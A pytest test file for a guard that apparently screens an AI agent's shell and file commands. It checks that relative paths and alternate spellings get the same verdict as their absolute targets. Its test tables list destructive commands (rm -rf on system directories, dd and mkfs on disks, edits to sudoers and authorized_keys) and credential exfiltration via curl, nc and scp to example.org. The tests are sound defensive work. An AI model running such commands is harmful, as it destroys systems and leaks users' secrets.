"""A relative path gets the verdict of the absolute path it names, and a path gets the verdict of its plain spelling, whatever
the process's own home directory is and whether the working directory lies inside it or not.

A home directory is ``/Users/<name>``, ``/home/<name>``, ``/root`` or the home of the process (``/mnt/c/Users/x``,
``/data/home/x``, ``/workspace``). A climb is made on the path as the event wrote it (its working directory), never on the
home the process happens to have: ``rm -rf ../../..`` from ``/Users/x/proj`` is ``rm -rf /`` whatever ``HOME`` is.

The tables are those of ``test_dangerous_relative_paths_and_ssh_files`` and ``test_dangerous_path_spellings``; every row runs
under each home below."""
from __future__ import annotations

import posixpath
import re
from pathlib import Path

import pytest
import test_dangerous_path_spellings as spellings
import test_dangerous_relative_paths_and_ssh_files as relative

from intentshield.dangerous import assess_file, assess_shell, paths

try:
    _OWN_HOME = str(Path.home())
except (RuntimeError, KeyError, OSError):
    _OWN_HOME = ""
if not paths._clean_homes((_OWN_HOME,)):   # a root, /tmp or a system directory is never taken for a home
    _OWN_HOME = "/home/dev"

HOMES = [_OWN_HOME, "/mnt/c/Users/x", "/data/home/x", "/workspace"]
_WORKED_FROM = "/Users/x"   # the directory the tables' working directories are written under


_SEVERITY = {"allow": 0, "ask": 1, "deny": 2}


def decision(hit) -> str:
    return hit.decision if hit else "allow"


def shell(command: str, cwd: str = "") -> str:
    return decision(assess_shell(command, cwd=cwd))


def _in_home(home: str, name: str) -> bool:
    """``~/../x`` comes back to a home directory: the user's own, or one a pattern names (``/Users/x``, ``/home/x``)."""
    target = posixpath.join(posixpath.dirname(home), name)
    return target == home or bool(re.match(r"/(?:Users|home)/[^/]+$", target))


@pytest.fixture
def at_home(monkeypatch):
    def use(home: str) -> None:
        monkeypatch.setenv("HOME", home)
        monkeypatch.delenv("USERPROFILE", raising=False)
        monkeypatch.setattr(Path, "home", staticmethod(lambda: Path(home)))
    return use


# --- the relative-against-absolute table ----------------------------------------------------------------------------------

@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize(("absolute", "spelled", "cwd"), relative.SAME_TARGET)
def test_a_relative_path_gets_the_verdict_of_the_absolute_one_under_any_home(at_home, home, absolute, spelled, cwd):
    at_home(home)
    expected = shell(absolute)
    assert expected != "allow"
    assert shell(spelled, cwd) == expected, f"{spelled} from {cwd}"


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize(("absolute", "spelled", "cwd"), [row for row in relative.SAME_TARGET
                                                        if row[2].startswith(_WORKED_FROM) and ".." not in row[1]])
def test_the_same_from_a_working_directory_inside_the_home(at_home, home, absolute, spelled, cwd):
    """The table's directory under ``/Users/x`` taken into the home of the process: ``rm -rf Documents`` from the home."""
    at_home(home)
    inside = home + cwd[len(_WORKED_FROM):]
    expected = shell(absolute)
    assert expected != "allow"
    assert shell(spelled, inside) == expected, f"{spelled} from {inside}"


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize("cwd", ["/Users/x/proj", "/home/dev/proj", "/Users/x", "/tmp/proj", "/data/home/other/proj",
                                 "/workspace/proj"])
@pytest.mark.parametrize("program", ["rm -rf", "find", "chmod -R 777"])
@pytest.mark.parametrize("climb", ["..", "../..", "../../..", "../../../.."])
def test_a_climb_is_made_on_the_working_directory_as_written(at_home, home, cwd, program, climb):
    """What a climb reaches is decided by the working directory and the number of ``..``, not by the process's home: it is
    never read as less than the absolute path it names (a bare ``..`` is also held for being above the working directory)."""
    at_home(home)
    reached = posixpath.normpath(posixpath.join(cwd, climb))
    tail = " -delete" if program == "find" else ""
    got, wanted = shell(f"{program} {climb}{tail}", cwd), shell(f"{program} {reached}{tail}")
    assert _SEVERITY[got] >= _SEVERITY[wanted], f"{program} {climb} from {cwd} reaches {reached}: {got}, not {wanted}"
    if reached == "/":
        assert got == "deny"


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize("target", ["/Users/x/proj", "/home/dev/proj", "/Users/x", "/data/home/other/proj"])
def test_a_climb_after_a_cd_is_made_on_the_directory_the_cd_names(at_home, home, target):
    at_home(home)
    depth = len([part for part in target.split("/") if part])
    climb = "/".join([".."] * depth)
    assert shell(f"cd {target} && rm -rf {climb}", "/tmp") == shell("rm -rf /") == "deny"
    assert shell(f"cd {target} && find {climb} -delete", "/tmp") == "deny"
    assert shell(f"cd {target} && cd .. && rm -rf {climb}", "/tmp") == "deny"


# --- the path-spelling table ------------------------------------------------------------------------------------------------

def _kept(label: str, home: str) -> bool:
    """A climb above the home directory only comes back to a home when the home has a sibling of that name."""
    return not label.startswith("home climb") or _in_home(home, spellings.HOME_NAME)


def _cwd(kind: str, home: str) -> str:
    return {"none": "", "inside": home + "/proj", "outside": "/tmp/proj"}[kind]


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize("kind", ["none", "inside", "outside"])
def test_a_command_gets_the_verdict_of_its_plain_spelling_under_any_home(at_home, home, kind):
    at_home(home)
    cwd = _cwd(kind, home)
    wrong = []
    for command, expected, label, variant in spellings.COMMAND_CASES:
        if not _kept(label.partition(" as ")[2], home):
            continue
        plain = shell(command, cwd)
        if kind == "none" and plain != expected:
            wrong.append(f"{command!r}: {plain}, expected {expected}")
        elif shell(variant, cwd) != plain:
            wrong.append(f"{variant!r} ({label}): {shell(variant, cwd)}, the plain spelling {plain}")
    assert not wrong, f"{len(wrong)} differ under HOME={home} from {cwd or 'no directory'}; first: {wrong[:5]}"


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize("kind", ["none", "inside", "outside"])
def test_a_file_tool_gets_the_verdict_of_its_plain_spelling_under_any_home(at_home, home, kind):
    at_home(home)
    cwd = _cwd(kind, home)
    wrong = []
    for path, expected, write, label, variant in spellings.FILE_CASES:
        if not _kept(label, home):
            continue
        content = "echo hello" if write else None
        plain = decision(assess_file(path, content, write=write, cwd=cwd))
        if kind == "none" and plain != expected:
            wrong.append(f"{path!r}: {plain}, expected {expected}")
        elif decision(assess_file(variant, content, write=write, cwd=cwd)) != plain:
            wrong.append(f"{variant!r} ({label}) differs from {path!r}")
    assert not wrong, f"{len(wrong)} differ under HOME={home} from {cwd or 'no directory'}; first: {wrong[:5]}"


# --- every program whose rule reads a path -----------------------------------------------------------------------------------

# The rows of the working-directory gap found in a block-device write or ``chattr`` run from a project directory: (a command
# with an absolute target, the same command spelled relative, the directory it runs in).
DEVICE_AND_ATTRIBUTE_ROWS = [
    ("chattr -R +i /", "chattr -R +i ../../..", "/Users/x/proj"),
    ("chattr -R +i /usr", "chattr -R +i ../../../usr", "/Users/x/proj"),
    ("chattr -R +i /etc", "chattr -R +i ../../../etc", "/Users/x/proj"),
    ("chattr -R +i /etc/hosts", "chattr -R +i ../../../etc/hosts", "/Users/x/proj"),
    ("dd if=/dev/zero of=/dev/sda", "dd if=/dev/zero of=../../../dev/sda", "/Users/x/proj"),
    ("echo x > /dev/sda", "echo x > ../../../dev/sda", "/Users/x/proj"),
    ("mkfs.ext4 /dev/sda", "mkfs.ext4 ../../../dev/sda", "/Users/x/proj"),
    ("mkfs.ext4 /dev/sda", "mkfs.ext4 dev/sda", "/"),
    ("dd if=/dev/zero of=/dev/sda", "dd if=/dev/zero of=sda", "/dev"),
    ("chattr -R +i /", "chattr -R +i .", "/"),
]


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize(("absolute", "spelled", "cwd"), DEVICE_AND_ATTRIBUTE_ROWS)
def test_a_device_write_or_attribute_change_from_a_working_directory_gets_the_absolute_verdict(at_home, home, absolute, spelled,
                                                                                               cwd):
    at_home(home)
    expected = shell(absolute)
    assert expected != "allow"
    assert shell(spelled, cwd) == expected, f"{spelled} from {cwd}"


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize("cwd", ["", "/tmp", "/Users/x/proj"])
def test_a_cd_to_the_directory_of_a_device_gives_a_write_there_the_absolute_verdict(at_home, home, cwd):
    at_home(home)
    assert shell("cd /dev && dd if=/dev/zero of=sda", cwd) == shell("dd if=/dev/zero of=/dev/sda") == "deny"
    assert shell("cd /dev && echo x > sda", cwd) == shell("echo x > /dev/sda") == "deny"
    assert shell("cd /dev; mkfs.ext4 sda", cwd) == "deny"
    assert shell("cd / && chattr -R +i etc", cwd) == shell("chattr -R +i /etc") == "deny"
    assert shell("pushd /dev && dd if=/dev/zero of=sda && popd", cwd) == "deny"
    assert shell("cd /dev && cd .. && dd if=/dev/zero of=dev/sda", cwd) == "deny"


# (a command with ``{p}`` where its path goes, the absolute targets it is run against). The relative spelling of each target is
# made from each working directory below, so every program is tried with the same climbs and the same directories.
_DEVICES = ["/dev/sda", "/dev/nvme0n1", "/dev/disk2"]
_SYSTEM_DIRS = ["/", "/usr", "/etc", "/Users", "/var/log"]
_HOME_DIRS = ["/Users/x", "/Users/x/Documents", "/Users/x/.ssh"]
_SECRETS = ["/Users/x/.ssh/id_rsa", "/Users/x/.aws/credentials", "/etc/shadow"]
_PERSISTENCE = ["/Users/x/.ssh/authorized_keys", "/etc/passwd", "/etc/sudoers", "/etc/profile", "/etc/cron.d/job"]
_OWN_FILES = ["/Users/x/.claude/settings.json", "/Users/x/.intentshield/hooks.db"]
PATH_RULES: list[tuple[str, list[str]]] = [
    ("chattr -R +i {p}", _SYSTEM_DIRS), ("chattr +i {p}", _DEVICES),
    ("dd if=/dev/zero of={p}", _DEVICES), ("dd of={p} if=/dev/zero bs=1M", _DEVICES), ("dd if=in.img of={p}", _PERSISTENCE),
    ("echo x > {p}", _DEVICES + _PERSISTENCE + _OWN_FILES), (": > {p}", _DEVICES), ("> {p}", _DEVICES + _PERSISTENCE),
    ("echo x >> {p}", _PERSISTENCE + _OWN_FILES), ("true 2> {p}", _DEVICES),
    ("mkfs.ext4 {p}", _DEVICES), ("mkfs -t ext4 {p}", _DEVICES), ("mke2fs {p}", _DEVICES), ("mkswap {p}", _DEVICES),
    ("mkdosfs {p}", _DEVICES), ("mkntfs {p}", _DEVICES), ("newfs {p}", _DEVICES), ("newfs_msdos {p}", _DEVICES),
    ("wipefs -a {p}", _DEVICES), ("shred -n1 {p}", _DEVICES), ("blkdiscard {p}", _DEVICES), ("ddrescue in.img {p} log", _DEVICES),
    ("sgdisk --zap-all {p}", _DEVICES), ("parted {p} mklabel gpt", _DEVICES), ("fdisk {p}", _DEVICES),
    ("cp image.img {p}", _DEVICES + _PERSISTENCE), ("mv image.img {p}", _DEVICES + _PERSISTENCE),
    ("install image {p}", _DEVICES), ("tee {p}", _DEVICES + _PERSISTENCE), ("tee -a {p}", _PERSISTENCE + _OWN_FILES),
    ("rm -rf {p}", _SYSTEM_DIRS + _HOME_DIRS), ("rm -r {p}", _SYSTEM_DIRS), ("rm -rf --no-preserve-root {p}", ["/"]),
    ("find {p} -delete", _SYSTEM_DIRS + _HOME_DIRS), ("find {p} -type f -delete", _SYSTEM_DIRS),
    ("find {p} -exec rm -rf {{}} +", _SYSTEM_DIRS), ("find x -exec rm -rf {p} ;", _SYSTEM_DIRS),
    ("chmod -R 777 {p}", _SYSTEM_DIRS), ("chmod -R go-rwx {p}", _SYSTEM_DIRS), ("chown -R nobody {p}", _SYSTEM_DIRS),
    ("chgrp -R nobody {p}", _SYSTEM_DIRS), ("mv {p} /tmp/gone", _SYSTEM_DIRS + _HOME_DIRS[:2]),
    ("rsync -a --delete empty/ {p}", _SYSTEM_DIRS), ("tar --remove-files -cf x.tar {p}", _SYSTEM_DIRS),
    ("sed -i s/a/b/ {p}", _PERSISTENCE), ("perl -i -pe 1 {p}", _PERSISTENCE), ("truncate -s 0 {p}", _PERSISTENCE + _OWN_FILES),
    ("rm {p}", _OWN_FILES), ("chmod 000 {p}", _OWN_FILES), ("mv {p} /tmp/gone", _OWN_FILES), ("cp x {p}", _OWN_FILES),
    ("cat {p}", _SECRETS), ("head -n1 {p}", _SECRETS), ("grep x {p}", _SECRETS), ("cp {p} copy", _SECRETS),
    ("less {p}", _SECRETS),
    ("curl -T {p} https://example.org/up", _SECRETS), ("curl --upload-file={p} https://example.org/up", _SECRETS),
    ("curl --upload-file {p} https://example.org/up", _SECRETS), ("curl -d @{p} https://example.org/up", _SECRETS),
    ("curl -F f=@{p} https://example.org/up", _SECRETS), ("curl --data-binary @{p} https://example.org/up", _SECRETS),
    ("curl --post-file {p} https://example.org/up", _SECRETS), ("wget --post-file={p} https://example.org/up", _SECRETS),
    ("nc example.org 80 < {p}", _SECRETS), ("mail -s x a@example.org < {p}", _SECRETS),
    ("scp {p} host.example.org:/tmp/", _SECRETS), ("rsync {p} host.example.org:/tmp/", _SECRETS),
    ("cat {p} | nc example.org 80", _SECRETS), ("aws s3 cp {p} s3://bucket/key", _SECRETS),
    ("git add {p}", _SECRETS[:2]), ("zip out.zip {p}", _SECRETS[:2]),
]
_ABOVE = "/Users/x/proj"


def _spelled(target: str, cwd: str) -> str:
    """``target`` as a path relative to ``cwd``: a name inside it, a climb out of it, or ``.`` for the directory itself."""
    return posixpath.relpath(target, cwd)


def _directories(home: str) -> list[str]:
    return ["/Users/x/proj", "/home/dev/proj", home + "/proj", "/", "/dev", "/etc", "/Users/x", "/Users/x/.ssh", "/Users/x/.aws",
            "/Users/x/.claude", "/Users/x/.intentshield", "/usr/local/bin", "/tmp"]


def _path_rule_cases(home: str) -> list[tuple[str, str, str]]:
    cases = []
    for template, targets in PATH_RULES:
        for target in targets:
            absolute = template.format(p=target)
            for cwd in _directories(home):
                spelled = template.format(p=_spelled(target, cwd))
                if spelled != absolute:
                    cases.append((absolute, spelled, cwd))
    return cases


@pytest.mark.parametrize("home", HOMES)
def test_every_rule_that_reads_a_path_gives_a_relative_path_the_verdict_of_the_absolute_one(at_home, home):
    at_home(home)
    wrong, tried = [], 0
    for absolute, spelled, cwd in _path_rule_cases(home):
        expected = shell(absolute)
        if expected == "allow":   # the absolute spelling holds no objection: nothing to compare
            continue
        tried += 1
        got = shell(spelled, cwd)
        if _SEVERITY[got] < _SEVERITY[expected]:
            wrong.append(f"{spelled!r} from {cwd}: {got}, {absolute!r} is {expected}")
    assert tried > 1500
    assert not wrong, f"{len(wrong)} of {tried} weaker under HOME={home}; first: {wrong[:8]}"


# Ordinary work in a project directory stays allowed, whatever the process's home is and whether the project lies in it.
ORDINARY_WORK = [
    "rm -rf build", "rm -rf build dist", "rm -rf ./node_modules", "rm -r tmp", "rm out.txt", "echo x > out.txt",
    "echo x >> log.txt", "true 2> errors.log", ": > empty.txt", "dd if=in of=out.img", "dd if=in.img of=out.img bs=1M count=4",
    "chattr +i notes.txt", "chattr -R +i docs", "mkfs.ext4 disk.img", "mkswap swapfile", "tee out.log", "cp a b", "mv old new",
    "install tool bin/tool", "chmod -R 755 scripts", "chmod 644 notes.txt", "chown -R nobody:nobody build",
    "find . -name '*.pyc' -delete", "find build -type f -delete", "rsync -a --delete src/ dest/",
    "tar --remove-files -cf x.tar build", "sed -i s/a/b/ config.ini", "cat README.md", "grep -r TODO src",
    "curl -T report.txt https://example.org/up", "git add .", "git commit -m 'fix a bug'", "pytest -q tests", "ls -la",
    "mkdir -p out/logs", "touch .gitkeep", "cat notes/id_rsa.md", "head -n1 data/dev/sda.txt",
]


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize("command", ORDINARY_WORK)
def test_ordinary_relative_project_work_stays_allowed_from_a_project_directory(at_home, home, command):
    at_home(home)
    blocked = {cwd: shell(command, cwd) for cwd in (home + "/proj", "/Users/x/proj", "/home/dev/proj", "/srv/app", "/tmp/w",
                                                    "/data/work/proj", "/workspace/proj", "/mnt/c/Users/x/proj")}
    if command.startswith("curl -T"):   # an upload to a host the user did not name is asked about, wherever it runs
        assert set(blocked.values()) == {"ask"}
    else:
        assert set(blocked.values()) == {"allow"}, blocked


_FILE_TARGETS = [*_PERSISTENCE, *_SECRETS, *_OWN_FILES, "/Users/x/.bashrc", "/Users/x/.npmrc", "/Users/x/.ssh/work",
                 "/Users/x/.kube/config", "/Users/x/.ssh/config.d/work"]


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize("write", [False, True], ids=["read", "write"])
def test_a_file_tool_gives_a_relative_path_the_verdict_of_the_absolute_one_from_every_directory(at_home, home, write):
    at_home(home)
    content = "echo hello" if write else None
    wrong, tried = [], 0
    for target in _FILE_TARGETS:
        expected = decision(assess_file(target, content, write=write))
        if expected == "allow":
            continue
        for cwd in _directories(home):
            spelled = _spelled(target, cwd)
            tried += 1
            got = decision(assess_file(spelled, content, write=write, cwd=cwd))
            if _SEVERITY[got] < _SEVERITY[expected]:
                wrong.append(f"{spelled!r} from {cwd}: {got}, {target!r} is {expected}")
    assert tried > 80
    assert not wrong, f"{len(wrong)} of {tried} weaker under HOME={home}; first: {wrong[:8]}"


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize(("path", "write"), [("README.md", False), ("src/app.py", True), ("out.txt", True),
                                             ("notes/id_rsa.md", False), ("tests/test_x.py", True), (".gitignore", True),
                                             ("docs/dev/sda.txt", True)])
def test_a_file_tool_reading_or_writing_an_ordinary_project_file_is_still_allowed(at_home, home, path, write):
    at_home(home)
    for cwd in (home + "/proj", "/Users/x/proj", "/home/dev/proj", "/srv/app", "/tmp/w", "/data/work/proj"):
        assert decision(assess_file(path, "x = 1" if write else None, write=write, cwd=cwd)) == "allow", cwd


@pytest.mark.parametrize("home", HOMES)
@pytest.mark.parametrize("command", [
    "bash -c 'chattr -R +i ../../..'", "sh -c 'dd if=/dev/zero of=../../../dev/sda'", "eval 'rm -rf ../../..'",
    "su -c 'rm -rf ../../..'", "find . -exec rm -rf ../../.. \\;", "find . -exec chattr -R +i ../../.. +",
    "echo ../../.. | xargs rm -rf", "echo ../../.. | xargs chattr -R +i", "xargs rm -rf <<< ../../..",
    "sudo bash -c 'rm -rf ../../..'", "(cd /dev && dd if=/dev/zero of=sda)", "$(rm -rf ../../..)", "bash <<< 'rm -rf ../../..'",
    "echo 'rm -rf ../../..' | sh", "nohup rm -rf ../../.. &", "env X=1 chattr -R +i ../../..", "time mkfs.ext4 ../../../dev/sda",
])
def test_a_command_run_by_another_command_reads_its_relative_paths_from_the_same_directory(at_home, home, command):
    at_home(home)
    assert shell(command, "/Users/x/proj") == "deny"
